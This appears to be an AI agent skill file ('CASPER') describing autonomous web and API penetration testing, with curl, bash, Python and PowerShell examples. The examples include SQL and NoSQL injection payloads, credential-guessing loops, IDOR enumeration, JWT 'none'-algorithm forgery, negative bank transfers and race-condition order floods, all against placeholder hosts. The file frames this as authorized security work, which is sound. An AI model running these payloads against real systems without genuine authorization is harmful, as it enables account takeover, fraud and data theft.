---
description: Enterprise-grade autonomous penetration testing framework for comprehensive web application and API security assessment using CLI tools, specializing in authorization bypass, injection attacks, business logic flaws, and security reporting
name: casper
---

# CASPER: Comprehensive Autonomous Security Penetration & Exploitation Research

> **Elite AI-Driven Security Assessment Framework**  
> Enterprise-grade penetration testing for web applications, REST APIs, GraphQL endpoints, and complex business systems using advanced command-line tools.

## What I Do

I am an advanced penetration testing framework that helps you conduct professional security assessments using command-line tools. I specialize in:

- **Authorization Bypass Testing**: Identify horizontal and vertical privilege escalation, IDOR vulnerabilities, JWT manipulation, multi-tenant isolation issues
- **Injection Attack Testing**: Discover SQL, NoSQL, command, code, template, XML, and GraphQL injection vulnerabilities
- **Business Logic Flaws**: Test financial transaction manipulation, workflow bypass, race conditions, and e-commerce logic
- **API Security Assessment**: Evaluate REST, GraphQL, and gRPC API security with comprehensive testing
- **Professional Reporting**: Generate executive summaries, technical documentation, and remediation guidance

## When to Use Me

Use this skill when you need to:

- Conduct comprehensive security assessment of web applications or APIs
- Test authorization controls and access management
- Identify injection vulnerabilities across different contexts
- Evaluate business logic in financial, e-commerce, or SaaS applications
- Generate professional penetration testing reports
- Perform API-specific security testing
- Validate security controls before production deployment

I am particularly useful for:
- Banking and financial applications
- E-commerce platforms
- SaaS and multi-tenant systems
- Healthcare and compliance-sensitive applications
- API-first architectures

## Core Capabilities

### 1. General Penetration Testing (casper-pt.md)
Comprehensive methodology for web application and API security testing using curl, jq, uv, python and bash.

**Key Features:**
- Reconnaissance and enumeration
- REST, GraphQL, and gRPC testing
- Authentication testing
- Session management analysis
- WAF bypass techniques
- Data exfiltration methods

**Example:**
```bash
# Enumerate API endpoints
curl -s https://api.target.com/api-docs | jq '.paths | keys[]'

# Test for default credentials
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  https://api.target.com/auth/login
```

### 2. Authorization Bypass Testing (casper-authorization.md, casper-authorization-advanced.md)
Advanced testing for access control vulnerabilities with both basic and enterprise-level techniques.

**Key Features:**
- Horizontal privilege escalation (IDOR)
- Vertical privilege escalation
- RBAC/ABAC bypass
- JWT token manipulation
- Multi-tenant security
- API endpoint authorization
- Financial system authorization

**Example:**
```bash
# Test horizontal privilege escalation
USER1_TOKEN="token1"
USER2_TOKEN="token2"

# Get user2's resource IDs
USER2_RESOURCES=$(curl -s -H "Authorization: Bearer $USER2_TOKEN" \
  https://api.target.com/resources | jq -r '.resources[].id')

# Try accessing with user1's token
for ID in $USER2_RESOURCES; do
  curl -s -H "Authorization: Bearer $USER1_TOKEN" \
    https://api.target.com/resources/$ID
done
```

### 3. Injection Attack Testing (casper-injection.md)
Comprehensive injection vulnerability testing across all contexts.

**Key Features:**
- SQL injection (classic, union, blind, time-based)
- NoSQL injection (MongoDB, JSON operators)
- Command injection
- Template injection (SSTI)
- XML/XXE injection
- GraphQL injection
- Polyglot payloads

**Example:**
```bash
# Test for SQL injection
curl -s "https://api.target.com/users?id=1' OR '1'='1"

# NoSQL injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"invalid"}}' \
  https://api.target.com/login
```

### 4. Business Logic Testing (casper-business-logic.md, casper-business-logic-advanced.md)
Test complex business process vulnerabilities in financial, e-commerce, and enterprise systems.

**Key Features:**
- Financial transaction manipulation
- Workflow bypass
- Race condition testing
- E-commerce discount abuse
- Time-based logic flaws
- Parameter boundary testing
- Multi-step process exploitation

**Example:**
```bash
# Test negative amount transfer
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"12345","to_account":"67890","amount":-100}' \
  https://bank.api.com/transfers
```

### 5. API-Specific Testing (casper-scan-api.md)
Safe, read-only API reconnaissance and vulnerability scanning.

**Key Features:**
- Endpoint enumeration
- GraphQL introspection
- Schema analysis
- Permission testing
- Rate limiting checks
- CORS misconfiguration

**Example:**
```bash
# GraphQL introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' \
  https://api.target.com/graphql
```

### 6. Automation with Different Languages

#### Python-Based Testing (casper-pt-python.md)
Advanced testing using Python's native libraries for complex operations.

**Example:**
```python
import urllib.request
import json

# Test authorization with Python
req = urllib.request.Request(
    'https://api.target.com/users/123',
    headers={'Authorization': 'Bearer token'}
)
response = urllib.request.urlopen(req)
print(json.loads(response.read()))
```

#### PowerShell-Based Testing (casper-pt-powershell.md)
Enterprise testing for Windows environments and Active Directory integration.

**Example:**
```powershell
# Test with PowerShell
$headers = @{'Authorization' = 'Bearer token'}
$response = Invoke-RestMethod -Uri 'https://api.target.com/users' -Headers $headers
$response | ConvertTo-Json
```

### 7. Professional Reporting (casper-pt-reporting-simple.md, casper-pt-reporting-advanced.md)
Generate comprehensive security assessment reports.

**Key Features:**
- Executive summaries
- Detailed technical findings
- CVSS scoring
- Business impact analysis
- Remediation recommendations
- Compliance mapping

## Testing Workflow

### 1. Reconnaissance Phase
```bash
# Identify API documentation
for path in swagger api-docs openapi.json graphql; do
  curl -s https://api.target.com/$path
done

# Analyze responses for version info
curl -I https://api.target.com/
```

### 2. Authentication Testing
```bash
# Test weak credentials
for user in admin root; do
  for pass in admin password 123456; do
    curl -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
      https://api.target.com/login
  done
done
```

### 3. Authorization Testing
```bash
# Create test script
cat > test_authz.sh << 'EOF'
#!/bin/bash
USER_TOKEN="$1"
ADMIN_ENDPOINTS=("/admin/users" "/admin/settings" "/admin/logs")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  echo "Testing: $endpoint"
  curl -s -H "Authorization: Bearer $USER_TOKEN" \
    https://api.target.com$endpoint
done
EOF

chmod +x test_authz.sh
./test_authz.sh "$USER_TOKEN"
```

### 4. Injection Testing
```bash
# Automated SQL injection test
PAYLOADS=("'" "1' OR '1'='1" "1' UNION SELECT NULL--")

for payload in "${PAYLOADS[@]}"; do
  curl -s "https://api.target.com/search?q=$payload" | \
    grep -i "error\|syntax\|mysql\|sql"
done
```

### 5. Business Logic Testing
```bash
# Race condition test for limited items
for i in {1..10}; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -d '{"product_id":"limited_item","quantity":1}' \
    https://api.target.com/orders &
done
wait
```

### 6. Report Generation
```bash
# Document findings
cat > findings.md << 'EOF'
# Security Assessment Report

## Executive Summary
[Summary of findings]

## Vulnerabilities
### VUL-01: SQL Injection
- Severity: Critical
- Location: /api/search
- Impact: Database compromise
EOF
```

## Common Vulnerability Patterns

### IDOR Detection
```bash
# Test sequential ID access
for id in {100..110}; do
  response=$(curl -s -H "Authorization: Bearer $TOKEN" \
    https://api.target.com/documents/$id)
  echo "ID $id: $response"
done
```

### JWT Manipulation
```bash
# Decode and analyze JWT
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq .

# Create token with "none" algorithm
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD='{"sub":"user","role":"admin"}'
FAKE_TOKEN=$(echo -n $HEADER | base64).$(echo -n $PAYLOAD | base64).
```

### SQL Injection
```bash
# Error-based detection
curl -s "https://api.target.com/users?id=1'" | grep -i "sql\|error\|syntax"

# Time-based detection
time curl -s "https://api.target.com/users?id=1' AND SLEEP(5)--"
```

## Best Practices

1. **Always Get Authorization**: Never test without written permission
2. **Test Safely**: Use read-only operations when possible
3. **Document Everything**: Save all requests, responses, and findings
4. **Respect Scope**: Stay within defined boundaries
5. **Report Responsibly**: Follow disclosure timelines

## Tool Requirements

### Essential Tools
- curl - HTTP client
- jq - JSON processor
- bash - Shell scripting
- grep/awk/sed - Text processing
- base64 - Encoding/decoding
- playwright - automating browser actions 
- mitmproxy - intercept, inspect, modify and replay web traffic and API
- mitmdump - view, record, replay and programmatically transform HTTP / API traffic.

### Optional Tools
- uv run - Advanced scripting
- pwsh - PowerShell for Windows
- grpcurl - gRPC testing
- jwt-cli - JWT manipulation
- sqlmap - SQL injection automation

## Reference Documents

All detailed methodologies are available in the casper-skill/ directory:

- **casper-pt.md** - Core penetration testing methodology
- **casper-authorization.md** - Authorization bypass basics
- **casper-authorization-advanced.md** - Advanced authorization techniques
- **casper-injection.md** - Injection vulnerability testing
- **casper-business-logic.md** - Business logic flaw testing
- **casper-business-logic-advanced.md** - Advanced business logic
- **casper-business-logic-python.md** - Python automation
- **casper-business-logic-powershell.md** - PowerShell automation
- **casper-scan-api.md** - Safe API scanning
- **casper-pt-python.md** - Python penetration testing
- **casper-pt-powershell.md** - PowerShell penetration testing
- **casper-pt-reporting-simple.md** - Basic reporting
- **casper-pt-reporting-advanced.md** - Advanced reporting

## Ethical Guidelines

### Legal Requirements
- Obtain written authorization before testing
- Test only within defined scope
- Respect system boundaries
- Avoid causing harm or disruption

### Professional Standards
- Maintain confidentiality
- Report vulnerabilities responsibly
- Follow disclosure timelines
- Provide constructive remediation guidance

### Testing Philosophy
- Use safe, non-destructive payloads
- Test in isolated environments when possible
- Minimize impact on production systems
- Document all testing activities thoroughly
- Use mitmproxy / mitmdump for a more thorough in-depth analysis where applicable
- Use methodolgies in casper-skill/ directory for in-depth assessments

## Example Scenarios

### Scenario 1: Banking API Assessment
```bash
# Test account access controls
curl -s -H "Authorization: Bearer $TOKEN" \
  https://bank.api.com/accounts/12345

curl -s -H "Authorization: Bearer $TOKEN" \
  https://bank.api.com/accounts/67890

# Test negative transfer
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":-1000,"to":"attacker"}' \
  https://bank.api.com/transfer
```

### Scenario 2: E-commerce Testing
```bash
# Test discount stacking
curl -X POST -d '{"code":"DISCOUNT20"}' \
  https://shop.com/api/apply-discount

curl -X POST -d '{"code":"WELCOME30"}' \
  https://shop.com/api/apply-discount

# Check final price
curl https://shop.com/api/cart
```

### Scenario 3: GraphQL Security
```bash
# Introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}' \
  https://api.target.com/graphql

# Test authorization
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ allUsers { id email password } }"}' \
  https://api.target.com/graphql
```

## Troubleshooting

### Connection Issues
```bash
# Increase timeout
curl --connect-timeout 30 --max-time 60 https://api.target.com
```

### SSL Certificate Errors
```bash
# Skip verification (testing only)
curl -k https://api.target.com
```

### Rate Limiting
```bash
# Add delays
for i in {1..10}; do
  curl https://api.target.com
  sleep 2
done
```

## Version Information

**Version:** 3.0  
**Last Updated:** 2026-01-07  
**Compatibility:** OpenCode Agent Skills Framework

---

**Remember:** Security testing is a professional responsibility. Always operate within legal and ethical boundaries, obtain proper authorization, and use these capabilities to improve security, not cause harm.

For detailed methodologies, consult the individual reference documents in the casper/ directory.
